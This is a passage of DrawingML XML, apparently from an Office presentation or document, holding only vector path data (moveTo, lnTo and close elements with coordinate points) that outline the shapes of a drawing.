                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="3411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="2861"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8658" y="7740"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8694" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="7740"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10198" y="2384"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9978" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="3411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="5355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="8363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="6052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="5832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="5612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="5612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="5025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="2714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="2494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="2384"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8694" y="7263"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7337" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="8363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="7263"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11702" y="8327"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11886" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="9390"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="9500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="8327"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11776" y="7887"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11299" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="8583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="9977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11446" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="9280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="7887"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8914" y="9354"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9061" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="10674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="9354"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8951" y="8950"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7154" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="11004"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="11114"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="10197"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="10087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="8950"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12473" y="10344"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12619" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="10894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="10674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="10344"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6273" y="10418"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6347" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="10894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="10894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="10418"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12583" y="9867"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12509" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="10894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="11921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="11921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="9867"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6200" y="9977"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5980" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="10087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="10784"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="10894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="11701"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="11921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="11114"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="10307"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="9977"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9832" y="11371"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10125" y="11921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="11921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="11371"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9868" y="10894"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8951" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="11481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="10894"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13133" y="12288"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13243" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13610" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="12618"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13023" y="12288"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7044" y="12325"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7337" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="13792"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="12325"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13060" y="11885"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12839" y="11921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="12068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11666" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11446" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11446" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11556" y="13315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="13902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13023" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="13205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="11885"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7190" y="11848"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7117" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="12508"/>
                  </a:lnTo>
